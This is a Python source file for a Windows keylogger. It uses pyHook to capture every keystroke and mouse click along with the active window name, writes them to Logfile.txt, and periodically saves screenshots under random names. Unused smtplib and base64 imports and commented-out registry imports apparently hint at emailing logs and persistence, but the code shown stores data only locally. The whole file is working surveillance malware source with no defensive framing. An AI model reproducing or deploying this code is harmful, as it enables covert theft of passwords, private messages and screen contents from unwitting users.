import sys
import os
#import win32api,pythoncom,winerror
import pythoncom
import pyHook,os,time,random,smtplib,string,base64
import datetime
import threading
import smtplib
#from _winreg import *

global t,start_time,pics_names
interval=120
                
t="";pics_names=[]

try:

    f = open('Logfile.txt', 'a')
    f.close()
except:

    f = open('Logfile.txt', 'w')
    f.close()



def ScreenShot():
    global pics_names
    import pyautogui
    def generate_name():
        return ''.join(random.choice(string.ascii_uppercase
                       + string.digits) for _ in range(7))
    name = str(generate_name())
    pics_names.append(name)
    pyautogui.screenshot().save(name + '.png')



def OnMouseEvent(event):
    global   interval
    data = '\n[' + str(time.ctime().split(' ')[3]) + ']' \
        + ' WindowName : ' + str(event.WindowName)
    data += '\n\tButton:' + str(event.MessageName)
    data += '\n\tClicked in (Position):' + str(event.Position)
    data += '\n===================='
    global t, start_time, pics_names

    t = t + data

    if len(t) > 300:
        ScreenShot()

    if len(t) > 500:
        f = open('Logfile.txt', 'a')
        f.write(t)
        f.close()
        t = ''

    if int(time.time() - start_time) == int(interval):
        #start_time = time.time()
        t = ''

    return True


def OnKeyboardEvent(event):
    global  interval
    data = '\n[' + str(time.ctime().split(' ')[3]) + ']' \
        + ' WindowName : ' + str(event.WindowName)
    data += '\n\tKeyboard key :' + str(event.Key)
    data += '\n===================='
    global t, start_time
    t = t + data

    if len(t) > 500:
        f = open('Logfile.txt', 'a')
        f.write(t)
        f.close()
        t = ''

    if int(time.time() - start_time) == int(interval):
        t = ''

    return True


hook = pyHook.HookManager()

hook.KeyDown = OnKeyboardEvent

hook.MouseAllButtonsDown = OnMouseEvent

hook.HookKeyboard()

hook.HookMouse()

start_time = time.time()

pythoncom.PumpMessages()